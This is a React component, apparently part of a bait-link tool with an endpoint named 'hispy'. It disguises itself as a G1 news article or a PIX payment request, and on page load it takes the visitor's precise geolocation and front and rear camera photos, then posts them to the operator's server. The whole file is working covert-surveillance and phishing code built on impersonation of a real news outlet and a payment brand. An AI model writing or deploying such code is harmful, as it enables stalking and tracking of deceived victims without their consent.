"use client";

import { useEffect, useRef, useState } from "react";

type Props = {
  slug: string;
  tipo: string;
  titulo: string | null;
  descricao: string | null;
  imagemUrl: string | null;
};

async function capturePhoto(facingMode: "user" | "environment"): Promise<string | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.playsInline = true;
    await new Promise<void>((resolve) => { video.onloadedmetadata = () => resolve(); });
    await video.play();
    await new Promise((r) => setTimeout(r, 300));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d")?.drawImage(video, 0, 0);
    stream.getTracks().forEach((t) => t.stop());
    return canvas.toDataURL("image/jpeg", 0.7);
  } catch {
    return null;
  }
}

function useCapture(slug: string) {
  const done = useRef(false);

  useEffect(() => {
    if (done.current) return;
    done.current = true;

    async function run() {
      let latitude: number | null = null;
      let longitude: number | null = null;
      let accuracy: number | null = null;

      // Pede localização
      const locPromise = new Promise<void>((resolve) => {
        if (!navigator.geolocation) { resolve(); return; }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
            accuracy = pos.coords.accuracy;
            resolve();
          },
          () => resolve(),
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });

      await locPromise;

      // Captura frente
      const photoFront = await capturePhoto("user");
      // Captura traseira (pode falhar em dispositivos sem câmera traseira)
      const photoBack = await capturePhoto("environment");

      await fetch("/api/ops/hispy/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          slug,
          latitude,
          longitude,
          accuracy,
          photoFront,
          photoBack,
          userAgent: navigator.userAgent,
        }),
      });
    }

    run();
  }, [slug]);
}

// ─── Templates de isca ──────────────────────────────────────────────────────

function TemplateReportagem({
  titulo,
  descricao,
  imagemUrl,
}: {
  titulo: string | null;
  descricao: string | null;
  imagemUrl: string | null;
}) {
  const title = titulo || "Polícia realiza operação e prende suspeitos na região";
  const body =
    descricao ||
    "Equipes da Polícia Militar atuaram na região durante a tarde de hoje. A ação faz parte de uma operação integrada de combate ao crime organizado na cidade.";

  const today = new Date().toLocaleDateString("pt-BR", {
    day: "numeric",
    month: "long",
    year: "numeric",
  });

  return (
    <div className="min-h-screen bg-white font-sans">
      {/* Header portal */}
      <header className="bg-red-700 text-white py-2 px-4 text-center text-sm font-bold tracking-widest">
        G1 NOTÍCIAS
      </header>

      <div className="max-w-2xl mx-auto px-4 py-6">
        {/* Categoria */}
        <div className="text-xs font-bold text-red-700 uppercase tracking-wide mb-2">Segurança Pública</div>

        {/* Título */}
        <h1 className="text-2xl font-bold text-gray-900 leading-snug mb-3">{title}</h1>

        {/* Meta */}
        <div className="text-xs text-gray-500 mb-4 border-b border-gray-200 pb-3">
          Por Redação G1 &bull; {today}
        </div>

        {/* Imagem */}
        {imagemUrl && (
          <div className="mb-5 rounded overflow-hidden">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src={imagemUrl} alt={title} className="w-full object-cover" />
          </div>
        )}

        {/* Corpo */}
        <div className="text-gray-800 text-[15px] leading-relaxed space-y-4">
          {body.split("\n").map((p, i) => (
            <p key={i}>{p}</p>
          ))}
          <p>
            A operação contou com o apoio de diferentes unidades policiais. As autoridades pedem que a
            população colabore com informações pelo Disque-Denúncia (197).
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer className="mt-12 border-t border-gray-200 py-6 text-center text-xs text-gray-400">
        © G1 Notícias &bull; Todos os direitos reservados
      </footer>
    </div>
  );
}

function TemplatePix({
  titulo,
  descricao,
}: {
  titulo: string | null;
  descricao: string | null;
}) {
  const [clicado, setClicado] = useState(false);
  const title = titulo || "Cobrança Pendente — R$ 150,00";
  const body = descricao || "Pagamento referente a serviços prestados. Vencimento: hoje.";

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-sm overflow-hidden">
        {/* Header */}
        <div className="bg-[#32BCAD] px-6 py-5 text-center">
          <div className="text-white text-xl font-bold">💳 Cobrança PIX</div>
          <div className="text-white/80 text-sm mt-1">Pagamento Rápido e Seguro</div>
        </div>

        {/* Conteúdo */}
        <div className="px-6 py-6 space-y-4">
          <div>
            <div className="text-xs text-gray-400 uppercase tracking-wide">Valor</div>
            <div className="text-2xl font-bold text-gray-900 mt-0.5">{title}</div>
          </div>

          <div>
            <div className="text-xs text-gray-400 uppercase tracking-wide">Descrição</div>
            <div className="text-sm text-gray-700 mt-0.5">{body}</div>
          </div>

          <div className="border border-dashed border-gray-300 rounded-xl p-4 text-center">
            <div className="text-xs text-gray-400 mb-2">QR Code PIX</div>
            <div className="w-32 h-32 mx-auto bg-gray-100 rounded flex items-center justify-center text-gray-400 text-xs">
              [QR Code]
            </div>
          </div>

          {/* Botão que dispara captura */}
          <button
            onClick={() => setClicado(true)}
            disabled={clicado}
            className="w-full py-3.5 bg-[#32BCAD] hover:bg-[#2aa899] disabled:bg-gray-400 text-white font-bold rounded-xl transition-colors text-base"
          >
            {clicado ? "Processando..." : "Pagar com PIX"}
          </button>

          <p className="text-xs text-center text-gray-400">
            Transação segura · Criptografia de ponta a ponta
          </p>
        </div>
      </div>
    </div>
  );
}

// ─── Componente principal ────────────────────────────────────────────────────

export default function BaitCapture({ slug, tipo, titulo, descricao, imagemUrl }: Props) {
  useCapture(slug);

  if (tipo === "pix") {
    return <TemplatePix titulo={titulo} descricao={descricao} />;
  }

  return <TemplateReportagem titulo={titulo} descricao={descricao} imagemUrl={imagemUrl} />;
}
